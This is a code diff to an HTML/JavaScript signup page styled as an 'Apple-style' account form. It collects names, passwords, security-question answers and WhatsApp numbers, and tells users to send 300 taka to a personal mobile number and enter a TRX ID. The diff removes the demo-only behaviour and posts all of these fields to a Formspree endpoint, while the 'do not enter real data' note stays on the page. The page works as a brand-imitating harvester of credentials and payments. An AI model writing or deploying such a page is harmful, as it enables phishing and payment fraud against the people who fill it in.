@@ -73,12 +73,7 @@
     input:focus,select:focus,textarea:focus{ border-color: var(--accent); box-shadow: 0 0 0 4px var(--ring) }
     input[aria-invalid="true"]{ border-color: var(--err); box-shadow:0 0 0 4px color-mix(in hsl, var(--err) 25%, transparent) }
 
-    /* Locked/read-only visual state */
-    .locked{
-      background: linear-gradient(180deg, #0b1020, #0b0f1a);
-      opacity: .85;
-      cursor: not-allowed;
-    }
+    .locked{ background: linear-gradient(180deg, #0b1020, #0b0f1a); opacity: .85; cursor: not-allowed; }
 
     .hint{ font-size:12px; color:var(--muted); margin-top:6px }
     .error{ font-size:12px; color:var(--err); margin-top:6px; min-height:1em }
@@ -96,10 +91,7 @@
 
     @media (max-width: 480px){ .actions button{ width:100% } }
 
-    dialog{
-      border:0; border-radius:12px; padding: var(--pad);
-      max-width: min(92vw, 420px); box-shadow: var(--shadow);
-    }
+    dialog{ border:0; border-radius:12px; padding: var(--pad); max-width: min(92vw, 420px); box-shadow: var(--shadow); }
     .divider{ height:1px; background: rgba(148,163,184,.2); margin: 6px 0 }
     .visually-hidden{ position:absolute!important; clip:rect(1px,1px,1px,1px); padding:0; border:0; height:1px; width:1px; overflow:hidden; white-space:nowrap }
   </style>
@@ -110,7 +102,8 @@
       <h2 id="formTitle">Create Your Apple-style Account</h2>
       <p class="note" id="demoNote">This is a demo — do not enter real personal data.</p>
 
-      <form id="signupForm" novalidate method="post" autocomplete="on" aria-describedby="demoNote">
+      <!-- ✅ Formspree integration -->
+      <form id="signupForm" novalidate method="POST" action="https://formspree.io/f/xyzdyrwj" autocomplete="on" aria-describedby="demoNote">
         <!-- Personal info -->
         <fieldset aria-describedby="nameHelp">
           <legend class="visually-hidden">Personal Information</legend>
@@ -179,7 +172,7 @@
               <label for="phone">Mobile Number</label>
               <input id="phone" name="tel" type="tel" inputmode="tel"
                      placeholder="01XXXXXXXXX or +8801XXXXXXXXX"
-                     pattern="^(?:\\+?8801\\d{9}|01\\d{9})$"
+                     pattern="^(?:\+?8801\d{9}|01\d{9})$"
                      autocomplete="tel-national" aria-describedby="phoneHint" />
               <p class="hint" id="phoneHint">Bangladeshi format: 01XXXXXXXXX (11 digits). International also allowed: +8801XXXXXXXXX.</p>
               <div class="error" id="err-phone" aria-live="polite"></div>
@@ -208,7 +201,6 @@
           </div>
         </fieldset>
 
-        <!-- Security (demo) -->
         <fieldset>
           <legend>Security Questions (Demo)</legend>
           <div class="row">
@@ -268,7 +260,7 @@
             <label for="whatsapp">WhatsApp নম্বর</label>
             <input id="whatsapp" name="whatsapp" type="tel" inputmode="tel"
                    placeholder="যেমন, +8801XXXXXXXXX বা 01XXXXXXXXX"
-                   pattern="^(?:\\+?8801\\d{9}|01\\d{9})$"
+                   pattern="^(?:\+?8801\d{9}|01\d{9})$"
                    autocomplete="tel" aria-describedby="whatsappHint" />
             <p class="hint" id="whatsappHint">
               গ্রাহক নিজে তার WhatsApp নম্বর লিখবে—আপনি পরে সেখানে যোগাযোগ করবেন।
@@ -278,19 +270,23 @@
           </div>
         </fieldset>
 
-        <!-- TRX (Bangla) -->
+        <!-- TRX (Bangla) — FIXED -->
         <fieldset>
           <legend>পেমেন্ট নিশ্চিতকরণ (ঐচ্ছিক)</legend>
           <div class="field">
             <label for="trxId">TRX ID</label>
-            <input id="trxId" name="trxId" type="text" inputmode="text"
-                   placeholder="উদাহরণ: 8–20 অক্ষর/সংখ্যা"
-                   pattern="^[A-Za-z0-9]{8,20}$" aria-describedby="trxHint" />
+            <input id="trxId" name="trxId" type="text" inputmode="numeric"
+                   placeholder="উদাহরণ: 1234567890 (১০ digit)"
+                   pattern="^\d{10}$"
+                   aria-describedby="trxHint" />
             <p class="hint" id="trxHint">
+              TRX ID অবশ্যই ১০ সংখ্যার হবে (শুধু 0–9 digit)।
+            </p>
+            <div class="error" id="err-trxId" aria-live="polite"></div>
+            <p class="hint">
               01630249778 এই নম্বরে 300 টাকা Send Money করে আপনার TRX ID দিন।
               TRX ID দিলে 5 মিনিটের মধ্যে আপনার WhatsApp-এ যোগাযোগ করা হবে। Thank you.
             </p>
-            <div class="error" id="err-trxId" aria-live="polite"></div>
           </div>
         </fieldset>
 
@@ -317,7 +313,7 @@
   </main>
 
   <dialog id="successDialog" inert>
-    <p>✅ Demo only: Form validated! (No data is actually sent.)</p>
+    <p>✅ Submitted! (Formspree received your data.)</p>
     <form method="dialog"><button>OK</button></form>
   </dialog>
 
@@ -350,11 +346,13 @@
       if (errEl) errEl.textContent = valid ? '' : msg;
     }
 
-    function passwordStrong(p){ return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[^\\w\\s]).{8,}$/.test(p); }
+    // Password regex fixed (single backslashes)
+    function passwordStrong(p){ return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^\w\s]).{8,}$/.test(p); }
     function passwordScore(p){
-      let s=0; if(p.length>=8)s++; if(/[A-Z]/.test(p))s++; if(/[a-z]/.test(p))s++; if(/\\d/.test(p))s++; if(/[^\\w\\s]/.test(p))s++;
+      let s=0; if(p.length>=8)s++; if(/[A-Z]/.test(p))s++; if(/[a-z]/.test(p))s++; if(/\d/.test(p))s++; if(/[^\w\s]/.test(p))s++;
       return Math.min(s,4);
     }
+
     function ageOK(dobStr){
       const dob = new Date(dobStr); if(isNaN(dob)) return false;
       const t = new Date();
@@ -378,8 +376,8 @@
       return `user${ts}${rnd}@example.com`;
     }
 
-    // EMAIL: keep visible, lock/unlock + show "watermark" (value)
-    useRandomEmail.addEventListener('change', ()=>{
+    // EMAIL: keep visible, lock/unlock
+    useRandomEmail?.addEventListener('change', ()=>{
       const on = useRandomEmail.checked;
       if (on){
         const randomEmail = genRandomEmail();
@@ -387,7 +385,7 @@
         emailInput.readOnly = true;
         emailInput.classList.add('locked');
         emailInput.setAttribute('aria-readonly', 'true');
-        emailInput.required = true; // still required, and already valid
+        emailInput.required = true;
       } else {
         emailInput.readOnly = false;
         emailInput.classList.remove('locked');
@@ -399,15 +397,15 @@
     });
 
     // PHONE: keep visible, lock/unlock + set "SKIP number"
-    skipPhone.addEventListener('change', ()=>{
+    skipPhone?.addEventListener('change', ()=>{
       const on = skipPhone.checked;
       if (on){
         phone.value = 'SKIP number';
         phone.readOnly = true;
         phone.classList.add('locked');
         phone.setAttribute('aria-readonly', 'true');
-        phone.required = false; // optional anyway
-        setFieldValidity(phone, true, ''); // bypass pattern while locked
+        phone.required = false;
+        setFieldValidity(phone, true, '');
       } else {
         phone.readOnly = false;
         phone.classList.remove('locked');
@@ -430,7 +428,7 @@
       setFieldValidity(cpw, !cpw.value || match, match ? '' : 'Passwords do not match.');
     });
     phone?.addEventListener('input', ()=>{
-      if (skipPhone.checked || phone.readOnly) { setFieldValidity(phone, true, ''); return; }
+      if (skipPhone?.checked || phone.readOnly) { setFieldValidity(phone, true, ''); return; }
       const pattern = new RegExp(phone.getAttribute('pattern'));
       const ok = !phone.value || pattern.test(phone.value);
       setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
@@ -443,15 +441,15 @@
     trxId?.addEventListener('input', ()=>{
       const pattern = new RegExp(trxId.getAttribute('pattern'));
       const ok = !trxId.value || pattern.test(trxId.value);
-      setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
+      setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ১০ digit হতে হবে (শুধু সংখ্যা)।');
     });
 
     // Eye toggles
     document.getElementById('togglePw')?.addEventListener('click', ()=>{ pw.type = pw.type === 'password' ? 'text' : 'password'; });
     document.getElementById('toggleCpw')?.addEventListener('click', ()=>{ cpw.type = cpw.type === 'password' ? 'text' : 'password'; });
 
-    // Submit
-    form.addEventListener('submit', (e)=>{
+    // Submit to Formspree
+    form.addEventListener('submit', async (e)=>{
       e.preventDefault();
 
       if (!form.checkValidity()){
@@ -472,35 +470,54 @@
       setFieldValidity(dobInput, ageOk, ageOk ? '' : 'You must be at least 13 years old.');
       if (!ageOk){ showStatus('You must be at least 13 years old.', 'err'); dobInput.focus(); return; }
 
-      // Phone: if it's locked/skipped, bypass; otherwise validate if provided
       if (phone && phone.value && !phone.readOnly){
         const ok = new RegExp(phone.getAttribute('pattern')).test(phone.value);
         setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
         if (!ok){ showStatus('Phone format is invalid.', 'err'); phone.focus(); return; }
       }
-
-      // WhatsApp (if provided)
       if (whatsapp && whatsapp.value.trim()){
         const ok = new RegExp(whatsapp.getAttribute('pattern')).test(whatsapp.value.trim());
         setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp নম্বরের ফরম্যাট ঠিক নেই।');
         if (!ok){ showStatus('WhatsApp নম্বরের ফরম্যাট ঠিক নেই।', 'err'); whatsapp.focus(); return; }
       }
-      // TRX (if provided)
       if (trxId && trxId.value.trim()){
         const ok = new RegExp(trxId.getAttribute('pattern')).test(trxId.value.trim());
-        setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
-        if (!ok){ showStatus('TRX ID ফরম্যাট সঠিক নয়।', 'err'); trxId.focus(); return; }
+        setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ১০ digit হতে হবে (শুধু সংখ্যা)।');
+        if (!ok){ showStatus('TRX ID ১০ digit হতে হবে (শুধু সংখ্যা)।', 'err'); trxId.focus(); return; }
       }
 
-      showStatus('✅ Demo: Form validated (no data sent).', 'ok');
-      if (typeof dlg?.showModal === 'function'){ dlg.removeAttribute('inert'); dlg.showModal(); }
+      showStatus('Submitting…', 'warn');
+
+      try{
+        const data = new FormData(form);
+        const res = await fetch(form.action, {
+          method: form.method,
+          body: data,
+          headers: { 'Accept': 'application/json' }
+        });
+
+        const result = await res.json().catch(()=> ({}));
+
+        if (!res.ok){
+          const msg = result?.errors?.[0]?.message || `Submission failed (${res.status})`;
+          showStatus(msg, 'err');
+          return;
+        }
+
+        showStatus('✅ Submitted successfully!', 'ok');
+        if (typeof dlg?.showModal === 'function'){ dlg.removeAttribute('inert'); dlg.showModal(); }
+        // form.reset(); // চাইলে রিসেট
+
+      } catch (err){
+        console.error(err);
+        showStatus('Network error. Please try again.', 'err');
+      }
     });
 
     // Reset
     document.getElementById('resetBtn')?.addEventListener('click', ()=>{
       showStatus('');
-      // unlock & clear email
-      if (useRandomEmail.checked){
+      if (useRandomEmail?.checked){
         useRandomEmail.checked = false;
         emailInput.readOnly = false;
         emailInput.classList.remove('locked');
@@ -508,8 +525,7 @@
         emailInput.value = '';
         emailInput.required = true;
       }
-      // unlock & clear phone
-      if (skipPhone.checked){
+      if (skipPhone?.checked){
         skipPhone.checked = false;
         phone.readOnly = false;
         phone.classList.remove('locked');
